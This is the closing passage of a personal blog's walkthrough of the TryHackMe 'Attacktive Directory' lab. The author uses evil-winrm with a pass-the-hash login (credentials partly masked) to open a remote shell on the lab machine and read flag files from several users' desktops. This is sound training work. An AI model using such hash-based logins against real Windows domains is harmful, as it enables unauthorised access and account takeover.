+</code></pre></div></div> <h1 id="elevating-privilages">Elevating Privilages</h1> <p>Now we got the hashes we can try to login in to the target. I used for the first time “Evil-WinRM” this is very powerfull tool. i have to explain in more detail when i used it more.</p> <p>But for this room i followed the instaruction ont the github page.</p> <p>We can login with the has of the a<strong>**</strong>*****r to the target and then get all the flags of the other user.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>fr3akazo1d💀fr3ak0ut<span class="o">)</span>-[~/Pen-Testing/THM/Boxes/AttacktriveDirectory]
+└─<span class="nv">$ </span>evil-winrm <span class="nt">-u</span> a<span class="k">***********</span>r <span class="nt">-H</span> 0<span class="k">******************************</span>c <span class="nt">-i</span> 10.10.124.175                            127 ⨯
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span><span class="k">***********</span>r<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ../Desktop
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span><span class="k">***********</span>r<span class="se">\D</span>esktop&gt; <span class="nb">ls
+
+
+    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\A</span><span class="k">***********</span>r<span class="se">\D</span>esktop
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-a----</span>         4/4/2020  11:39 AM             32 root.txt
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span><span class="k">***********</span>r<span class="se">\D</span>esktop&gt; more root.txt
+T<span class="k">******************************</span><span class="o">}</span>
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span><span class="k">***********</span>r<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ../../
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers&gt; <span class="nb">ls
+
+
+    </span>Directory: C:<span class="se">\U</span>sers
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+d-----        9/17/2020   4:04 PM                a-spooks
+d-----        9/17/2020   4:02 PM                A<span class="k">***********</span>r
+d-----         4/4/2020  12:19 PM                b<span class="k">****</span>p
+d-----         4/4/2020   1:07 PM                b<span class="k">****</span>p.THM-AD
+d-r---         4/4/2020  11:19 AM                Public
+d-----         4/4/2020  12:18 PM                s<span class="k">*******</span>n
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers&gt; <span class="nb">cd </span>b<span class="k">****</span>p
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\b</span><span class="k">****</span>p&gt; <span class="nb">cd </span>Desktop
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\b</span><span class="k">****</span>p<span class="se">\D</span>esktop&gt; <span class="nb">ls
+
+
+    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\b</span><span class="k">****</span>p<span class="se">\D</span>esktop
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-a----</span>         4/4/2020  12:19 PM             26 PrivEsc.txt
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\b</span><span class="k">****</span>p<span class="se">\D</span>esktop&gt; more PrivEsc.txt
+T<span class="k">**********************</span>y!<span class="o">}</span>
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\b</span><span class="k">****</span>p<span class="se">\D</span>esktop&gt; <span class="nb">cd</span> ../../s<span class="k">*******</span>n/Desktop
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span><span class="k">*******</span>n<span class="se">\D</span>esktop&gt; <span class="nb">ls
+
+
+    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\s</span>s<span class="k">*******</span>n<span class="se">\D</span>esktop
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-a----</span>         4/4/2020  12:18 PM             28 user.txt.txt
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span><span class="k">*******</span>n<span class="se">\D</span>esktop&gt; <span class="nb">cat </span>user.txt.txt
+T<span class="k">************************</span>h<span class="o">}</span>
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span><span class="k">*******</span>n<span class="se">\D</span>esktop&gt; 
+</code></pre></div></div> <h1 id="summary">Summary</h1> <p>I learnd a lot in this room about attackting the Active Directory. Some Tools i have used for the first time. So i had to goolge the usage of the tools. But now i have a better understanding how i can enumerate a windows Active Directory.</p> <br /><!-- Load Facebook SDK for JavaScript --> <div id="fb-root"></div> <script> (function(d, s, id) { var js, fjs = d.getElementsByTagName(s)[0]; if (d.getElementById(id)) return; js = d.createElement(s); js.id = id; js.src = "https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v3.0"; fjs.parentNode.insertBefore(js, fjs); })(document, "script", "facebook-jssdk"); </script> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8" ></script> <div class="share-page"> <p class="share-text">Share this on &rarr;</p> <a href="https://twitter.com/share?ref_src=twsrc%5Etfw" class="twitter-share-button" data-size="large" data-show-count="false" style="margin-top:5px;" >Tweet</a > <a class="fb-share-button" data-href="/blog/attacktivedirectory/" data-size="large" data-layout="button" >Share</a> </div><!-- Author box --> <div class="card"> <div class="card-header"> About Fr3akazo1d! </div> <div class="card-body"> <div class="row"> <div class="col-md-4"> <img class="author-profile-img" src="/assets/img/authors/freakazoid.png" alt="Fr3akazo1d!" /> </div> <div class="col-md-6"> <p class="author_bio">Cyber-Security Entusiast, CTF-Player</p> <p>Email : fr3akazo1d@protonmail.com</p> <p>Website : https://fr3akazo1d.github.io</p> <p class="profile-links"> <a class="social-link" href="https://github.com/fr3akazo1d" target="_blank"><i class="fab fa-github fa-fw"></i></a> </p> </div> </div> </div> </div> </div> <!-- Incomment incase you want to use Disqus <div id="disqus_thread"></div> --> </article> <script> var disqus_config = function () { this.page.url = "/blog/attacktivedirectory/"; /* Replace PAGE_URL with your page's canonical URL variable */ this.page.identifier = "/blog/thm-Attacktive-Directory-Writeup"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */ }; (function () { /* DON'T EDIT BELOW THIS LINE */ var d = document, s = d.createElement('script'); s.src = 'https://.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); </script> <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a> </noscript></div> </div> <div class="row"> <div class="col-md-4"> <div class="card"> <div class="card-header">About Phil Malle</div> <div class="card-body"> <p class="author_bio">Hi, my name is Phil Malle. This is my personal blog about technologies, Cyber-Security and other similar topics.</p><a class="github-button" href="https://github.com/PhilMalle/philmalle.github.io" data-color-scheme="no-preference: dark; light: dark; dark: dark;" data-icon="octicon-star" data-size="large" data-show-count="true" aria-label="Star PhilMalle/philmalle.github.io on GitHub">Star</a> </div> </div> </div> <div class="col-md-4"> <div class="card"> <div class="card-header">Categories</div> <div class="card-body text-dark"> <div id="#walkthroughs"></div> <li class="tag-head"> <a href="/blog/categories/walkthroughs">walkthroughs</a> </li> <a name="walkthroughs"></a> <div id="#journey"></div> <li class="tag-head"> <a href="/blog/categories/journey">journey</a> </li> <a name="journey"></a> </div> </div> </div> <div class="col-md-4"> <div class="card"> <div class="card-header">Useful Links</div> <div class="card-body text-dark"> <li> <a href="/about">About Me</a> </li> <li> <a href="/gallery">Achievements</a> </li> <li> <a href="/blog">Blog</a> </li> <li> <a href="/contact">Contact</a> </li> <li> <a href="/links">Links</a> </li> <li> <a href="/pgp">GNUPG-Public Key</a> </li> </div> </div> </div> </div> </div><footer> <p> Powered by<a href="https://github.com/sujaykundu777/devlopr-jekyll"> devlopr jekyll</a>.Hosted at <a href="https://pages.github.com">Github</a>. &copy; by Phil Malle 2021</p> </footer> <script> var options = { classname: 'progressline', id: 'my-id' }; var nanobar = new Nanobar( options ); nanobar.go( 30 ); nanobar.go( 76 ); nanobar.go(100); </script> <div hidden id="snipcart" data-api-key="Y2I1NTAyNWYtMTNkMy00ODg0LWE4NDItNTZhYzUxNzJkZTI5NjM3MDI4NTUzNzYyMjQ4NzU0"></div> <script src="https://cdn.snipcart.com/themes/v3.0.0-beta.3/default/snipcart.js" defer></script> <script src="/assets/js/mode-switcher.js"></script> <script> if (window.netlifyIdentity) { window.netlifyIdentity.on("init", user => { if (!user) { window.netlifyIdentity.on("login", () => { document.location.href = "/admin/"; }); } }); } </script> <!-- olvy releases --> <script> var OlvyConfig = { organisation: "", target: "#olvy-target", type: "sidebar", view: { showSearch: true, compact: true, showHeader: true, /* only applies when widget type is embed. you cannot hide header for modal and sidebar widgets */ showUnreadIndicator: true, unreadIndicatorColor: "#FFA13AFF", unreadIndicatorPosition: "top-right" } }; </script> <script type="text/javascript" src="https://app.olvy.co/script.js" defer="defer"></script> </body> </html>
